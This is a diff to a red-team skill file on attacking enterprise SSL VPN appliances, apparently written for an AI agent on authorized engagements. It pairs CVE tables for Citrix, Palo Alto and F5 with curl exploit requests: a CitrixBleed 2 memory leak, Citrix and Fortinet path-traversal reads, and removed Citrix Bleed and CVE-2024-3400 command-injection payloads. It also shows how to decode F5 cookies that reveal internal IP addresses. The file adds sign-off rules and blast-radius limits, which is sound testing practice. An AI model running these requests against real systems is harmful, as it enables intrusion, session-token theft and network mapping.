@@ -1,7 +1,7 @@
 ---
 name: enterprise-vpn-attack
 description: External SSL VPN / remote-access appliance attack matrix — Cisco ASA/AnyConnect, Fortinet FortiGate/FortiOS, Citrix NetScaler/ADC, Palo Alto GlobalProtect, Pulse Secure / Ivanti Connect Secure, SonicWall, F5 Big-IP. Covers version fingerprinting, CVE matrix (2018-2026), AAA backend identification, default credentials, configuration-disclosure paths, pre-auth RCE/SSRF/path-traversal exploits where applicable. Built from authorized-engagement Cisco ASA testing plus 2024-2026 enterprise VPN CVE landscape. Use whenever the target's perimeter exposes any SSL VPN appliance or remote-access gateway — these are the most common initial-access points in 2024-2026 actor TTPs.
-sources: authorized-engagement, public-advisories, cisa-kev
+sources: authorized-engagement, public-advisories, cisa-kev, citrix-security-bulletins, f5-security-advisories, nvd, watchtowr-labs, horizon3
 report_count: 1
 ---
 
@@ -146,16 +146,77 @@ curl -sk --path-as-is 'https://target/remote/fgt_lang?lang=/../../../../////////
 | **CVE-2022-27518** | ADC/Gateway with SAML configured | Pre-auth RCE | Complex; test with nuclei |
 | **CVE-2023-3519** | NetScaler ADC/Gateway 13.0-13.1 specific | Pre-auth RCE via crafted HTTP | Public PoCs exist |
 | **CVE-2023-4966** (Citrix Bleed) | NetScaler ADC/Gateway 13.0-14.1 | Memory disclosure → session token theft | `POST /oauth/idp/.well-known/openid-configuration` with crafted Host header — long Host header triggers memory leak in response |
+| **CVE-2025-5349** | 14.1 < 14.1-43.56; 13.1 < 13.1-58.32; 13.1-FIPS/NDcPP < 13.1-37.235; 12.1-FIPS < 12.1-55.328 | Improper access control on the NetScaler management interface — needs reach to NSIP / cluster-mgmt IP / local GSLB site IP | Stage A — is the NSIP answering from outside at all? |
+| **CVE-2025-5777** (CitrixBleed 2) | same builds as CVE-2025-5349; needs Gateway (VPN vserver, ICA Proxy, CVPN, RDP Proxy) or AAA vserver | Insufficient input validation → memory overread; live session tokens land in the leaked bytes | Stage A = control request only; Stage B = the diff. See block below |
+| **CVE-2025-6543** | 14.1 < 14.1-47.46; 13.1 < 13.1-59.19; 13.1-FIPS/NDcPP < 13.1-37.236 (12.1-FIPS not affected); same Gateway/AAA precondition | Memory overflow → unintended control flow + DoS; in CISA KEV, exploited in the wild | Version match only — **SKIP in red team, the only proof is a crash** |
+| **CVE-2025-7775** | 14.1 < 14.1-47.48; 13.1 < 13.1-59.22; 13.1-FIPS/NDcPP < 13.1-37.241; 12.1-FIPS/NDcPP < 12.1-55.330 | Memory overflow → pre-auth RCE and/or DoS; in CISA KEV, exploited in the wild | Version match only — **SKIP in red team, the RCE path is the crash path** |
+| **CVE-2025-7776** | same builds as CVE-2025-7775; needs a Gateway with a PCoIP profile bound to it | Memory overflow → erroneous behaviour + DoS | **SKIP in red team — disruptive** |
+| **CVE-2025-8424** | same builds as CVE-2025-7775 | Improper access control on the management interface — needs NSIP / cluster-mgmt IP / GSLB site IP / SNIP with mgmt access | Stage A — same NSIP-exposure check as CVE-2025-5349 |
+
+Branches 12.1 and 13.0 are End Of Life: Citrix declares them vulnerable and ships no fix, so an EOL build is a finding on the version string alone. Ranges above are the vendor's own, from bulletins CTX693420 (5349/5777), CTX694788 (6543) and CTX694938 (7775/7776/8424).
 
 ```bash
-# Citrix Bleed (CVE-2023-4966) detection
-HOST=$(python3 -c "print('A' * 24812)")
-curl -sk -X POST -H "Host: $HOST" "https://target/oauth/idp/.well-known/openid-configuration" -o response.txt
-# If response is large (>10KB) and contains random memory contents — vulnerable
-# Session tokens often present in the memory dump
+# Citrix Bleed (CVE-2023-4966).
+# Stage A — version match only. The build string decides this CVE on its own; the
+# vendor ranges are above. There is no memory-safe differential: the only signal
+# this bug produces IS other users' memory, so detection stops at the version.
+curl -sk -X POST "https://target/oauth/idp/.well-known/openid-configuration" \
+  -H 'Host: target' -o /dev/null -w 'baseline body: %{size_download} bytes\n'
+# A normal Host header. Record the baseline size so a later authorized Stage B
+# request has something to diff against. This request leaks nothing.
+```
 
-# CVE-2019-19781 file read
+**Stage B — requires explicit written sign-off naming this CVE.** The long-Host
+request returns up to ~24 KB of the appliance's memory, and in the wild that
+memory routinely carries **other users' live NSC_AAAC session tokens**. Capturing
+one is unauthorized access to that person's account, not a scanner finding.
+
+- **One request. Never loop**, and never iterate to "get a better sample": each
+  repeat is a fresh grab of a different user's data.
+- Write the response to a file handled under `evidence-hygiene`, not to the terminal.
+- **Do not authenticate with anything you find.** The finding is complete at "the
+  response contains session material that is not mine": record the token count and
+  type, redact the values, report immediately. A leaked live token is an active
+  incident for the target, not a detail for the write-up.
+- Patching does not kill already-stolen sessions, which is why this CVE kept being
+  exploited after fixes shipped. Citrix's guidance is `kill icaconnection -all`,
+  `kill pcoipConnection -all`, `kill aaa session -all` and
+  `clear lb persistentSessions` after upgrading.
+
+```bash
+# CVE-2019-19781 file read. Stage A: smb.conf is a config file, not user data,
+# and the read is non-destructive — but it is still an unauthenticated file read
+# off a production appliance, so it belongs in an authorized window.
 curl -sk --path-as-is 'https://target/vpn/../vpns/cfg/smb.conf'
+```
+
+```bash
+# CitrixBleed 2 (CVE-2025-5777). The vendor confirms only "insufficient input validation
+# leading to memory overread"; the endpoint below is researcher-derived (watchTowr Labs,
+# Horizon3.ai), so treat the mechanism as vendor-confirmed and the probe as third-party.
+
+# Stage A — DETECTION ONLY. Leaks nothing: the `=` is present, so the value parses normally.
+curl -sk -X POST 'https://target/p/u/doAuthentication.do' \
+  -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'login=' -o /tmp/cb2_base.xml
+grep -o '<InitialValue>.*</InitialValue>' /tmp/cb2_base.xml
+# With the `=` present InitialValue comes back empty. That is your baseline, and the
+# endpoint answering + a Gateway/AAA vserver + an affected build is already reportable.
+
+# Stage B — REQUIRES EXPLICIT WRITTEN SIGN-OFF. Drops the `=` so the value is never parsed.
+# Blast radius: ~127 bytes of appliance stack per request, belonging to other users, and
+# known to contain live session tokens. Handle as client credential material — do not
+# replay it, do not store it outside the engagement vault, report the fact not the bytes.
+# Bound: ONE request. Do not loop, do not poll, do not script it.
+curl -sk -X POST 'https://target/p/u/doAuthentication.do' \
+  -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'login' -o /tmp/cb2_test.xml
+diff /tmp/cb2_base.xml /tmp/cb2_test.xml
+# Vulnerable = InitialValue in the test response carries stack bytes the baseline did not.
+# The researchers' own wording on the patched case is inconsistent, so one request is
+# INCONCLUSIVE by itself — pair the diff with the build number before calling it.
+
+# Remediation check: patching does not invalidate tokens already stolen. CTX693420 tells
+# the admin to run `kill icaconnection -all` and `kill pcoipConnection -all` once every
+# node in the HA pair / cluster is upgraded. Verify that in the re-test, not just the build.
 ```
 
 ### Palo Alto GlobalProtect
@@ -165,12 +226,39 @@ curl -sk --path-as-is 'https://target/vpn/../vpns/cfg/smb.conf'
 | **CVE-2024-3400** | PAN-OS 10.2-11.1 with GP enabled | Command injection — pre-auth RCE | `POST /ssl-vpn/login.esp` with crafted Cookie header containing `SESSID=../../../var/log/pan/test.txt` |
 
 ```bash
-# CVE-2024-3400 detection
-curl -sk -X POST 'https://target/ssl-vpn/login.esp' \
-  -H 'Cookie: SESSID=../../../var/log/pan/test_$(id)_test.txt' \
-  --data 'jsessionid=test'
-# Look for file-creation side-effect on test path — palo creates file with command output
+# CVE-2024-3400.
+# Stage A — version and feature match only. PAN-OS 10.2 / 11.0 / 11.1 with both
+# GlobalProtect gateway (or portal) AND device telemetry enabled. The version
+# plus that feature pair decides it; nothing below executes anything.
+curl -sk 'https://target/global-protect/login.esp' -o /dev/null \
+  -w 'GP portal present: HTTP %{http_code}\n'
+# Then take the build from the vendor-facing banner or from the client's own
+# inventory. Do not try to infer the patch level from behaviour.
 ```
+
+**Stage B — requires explicit written sign-off naming this CVE.** The published
+proof for this bug is **command injection**: the `SESSID` cookie value becomes a
+filename, so a shell metacharacter in it runs as root on the firewall and leaves
+a file behind on the appliance's filesystem.
+
+Previously this block shipped a `$(id)` payload under the heading "detection".
+That is remote command execution on a perimeter firewall, and it also writes to
+`/var/log/pan/`, which is a persistent change to the device. It is not detection
+and must never be run as a discovery step.
+
+- Take the exact request from Palo Alto's advisory for CVE-2024-3400 at
+  exploitation time. Do not reconstruct it from memory, and do not reuse a
+  payload from a blog without reading what it writes.
+- Benign marker only: a sleep or an `id`-equivalent whose output you diff against
+  a saved baseline. **No shell, no write outside the path the PoC already
+  touches, no persistence.**
+- You must record every file the proof creates and hand that list to the target,
+  because the artefact is indistinguishable from a real intrusion in their logs.
+- A confirmed-RCE claim needs a unique canary echoed back plus a diff against a
+  baseline captured before the request (see `vmware-vcenter-attack` Step 4).
+- This CVE is in CISA KEV and was mass-exploited. Assume the target's SOC is
+  watching this exact endpoint and notify your point of contact **before** the
+  request, not after.
 
 ### Pulse Secure / Ivanti Connect Secure / Policy Secure
 
@@ -192,6 +280,68 @@ curl -sk --path-as-is 'https://target/dana-na/../dana/html5acc/guacamole/../../.
 |---|---|---|---|
 | **CVE-2021-20016** | SMA 100 series specific firmware | SQL injection — pre-auth | nuclei template available |
 | **CVE-2024-40766** | SonicOS specific | Access-control flaw | Specific firmware versions |
+
+### F5 Big-IP / APM
+
+| CVE | Affects | Type | Test |
+|---|---|---|---|
+| **CVE-2020-5902** | BIG-IP 15.0.0-15.1.0.3, 14.1.0-14.1.2.5, 13.1.0-13.1.3.3, 12.1.0-12.1.5.1, 11.6.1-11.6.5.1 | TMUI (Configuration utility) path traversal → pre-auth RCE; in CISA KEV | Stage A — is the management plane answering from outside? |
+| **CVE-2022-1388** | BIG-IP 16.1.x < 16.1.2.2, 15.1.x < 15.1.5.1, 14.1.x < 14.1.4.6, 13.1.x < 13.1.5, all 12.1.x (≤ 12.1.6) and 11.6.x (≤ 11.6.5); 17.0.x unaffected | iControl REST auth bypass (CWE-306) → root command exec; in CISA KEV | Stage A — `/mgmt/shared/authn/login` answering = iControl REST exposed |
+| **CVE-2023-46747** | BIG-IP branches 13.1.0 / 14.1.0 / 15.1.0 / 16.1.0 / 17.1.0, fixed at 13.1.5.1 / 14.1.5.6 / 15.1.10.2 / 16.1.4.1 / 17.1.0.3 | Configuration-utility auth bypass via AJP request smuggling → root command exec; in CISA KEV | Stage A — same management-plane exposure check |
+| **CVE-2023-46748** | same branches and fixed builds as CVE-2023-46747 | Authenticated SQL injection in the Configuration utility → command exec | Needs a session — it is the second half of the 46747 chain, never a standalone finding |
+| **CVE-2025-53521** | BIG-IP APM 15.1.0 < 15.1.10.8, 16.1.0 < 16.1.6.1, 17.1.0 < 17.1.3, 17.5.0 < 17.5.1.3, with an APM access policy on a virtual server | Stack-based overflow (CWE-121) → pre-auth RCE; in CISA KEV since 2026-03-27 | Version match only — **SKIP in red team, crash risk on a live VPN** |
+
+Note which plane each one lives on. CVE-2020-5902, CVE-2022-1388, CVE-2023-46747 and
+CVE-2023-46748 all need the management plane — the management port or a self IP — to be
+reachable, so a BIG-IP with its Configuration utility properly firewalled is not exposed to
+them. CVE-2025-53521 is different: it is reachable through the APM virtual server that
+serves `/my.policy`, which is exactly the surface this skill is pointed at. An unpatched APM
+is therefore a far bigger finding than an unpatched Configuration utility behind a firewall.
+
+```bash
+# F5 Stage A — detection only. No traversal, no auth attempt, no credentials sent.
+curl -skI 'https://target/my.policy' | head -5     # APM policy present = CVE-2025-53521 precondition
+curl -sk -o /dev/null -w '%{http_code}\n' 'https://target/mgmt/shared/authn/login'
+# Anything other than a connection failure means iControl REST — the management plane — is
+# reachable from outside. Report that on its own merits: CERT/CC VU#290915 (the CVE-2020-5902
+# note) states plainly that TMUI must be blocked from untrusted networks.
+# DO NOT POST to that URI: it is the documented token-login endpoint, and a POST with a
+# username is a login attempt against the appliance's admin account.
+
+# Stage B — REQUIRES EXPLICIT WRITTEN SIGN-OFF, and deliberately not reproduced here.
+# Every working proof for CVE-2020-5902, CVE-2022-1388 and CVE-2023-46747 either reads a
+# file off the appliance or runs a command as root — there is no detection-only variant.
+# Blast radius: root on the box terminating the client's VPN, plus the LDAP bind and RADIUS
+# shared secret in its config. Take the exact request from the vendor advisory at
+# exploitation time, so you are working from the patched-state reference, not from this file.
+```
+
+### F5 `BIGipServer` cookie — internal topology for free
+
+The `Set-Cookie: BIGipServer<pool>` value from the fingerprinting step is not a session id.
+With cookie persistence (`HTTP Cookie Insert` / `Cookie Rewrite`) the BIG-IP encodes the
+chosen pool member's real address and port into it. No CVE, no exploit, no unusual request —
+one normal page load discloses a node of the internal network.
+
+| Cookie value shape | Backend | Decode |
+|---|---|---|
+| `1677787402.36895.0000` | IPv4 pool member | Both fields are little-endian. `1677787402` → `0x6401010A` → reverse bytes → `10.1.1.100`. `36895` → `0x901F` → reverse → `0x1F90` → `8080`. The trailing `0000` is a reserved placeholder, always zeroes. |
+| `vi20010112000000000000000000000030.20480` | IPv6 pool member | `vi` + the full 32-hex IPv6 address (`2001:112::30`), then the same byte-swapped port (`20480` → `0x5000` → `0x0050` → `80`). |
+| `rd5o00000000000000000000ffffc0000201o80` | pool member in a non-default route domain | `rd<id>o<32-hex address>o<port>`. Address is plain hex, IPv4 shows up `::ffff:`-mapped (`c0000201` = `192.0.2.1`), route domain `5`. The port here is **plain decimal**, not byte-swapped. |
+| matches none of the three | encrypted | `encrypt-cookies` is set on the HTTP profile. Not decodable without the profile passphrase — record it as a positive hardening finding, the same way you record a stripped banner. |
+
+```bash
+# Decode the IPv4 form offline — no traffic to the target at all.
+python3 -c 'import sys,ipaddress;a,p,_=sys.argv[1].split(".");print(ipaddress.IPv4Address(int(a).to_bytes(4,"little")), int.from_bytes(int(p).to_bytes(2,"little"),"big"))' \
+  1677787402.36895.0000
+# -> 10.1.1.100 8080
+```
+
+Each distinct cookie you collect across hostnames and paths is one more backend node, so a
+handful of normal browsing requests maps the internal addressing plan, the ports services
+actually listen on, and the member count per pool. Report it as information disclosure with
+the decoded set attached; the fix is the vendor's own, an HTTP profile with
+`encrypt-cookies add { <cookie_name> }` plus an `encrypt-cookie-secret` passphrase.
 
 ---
 
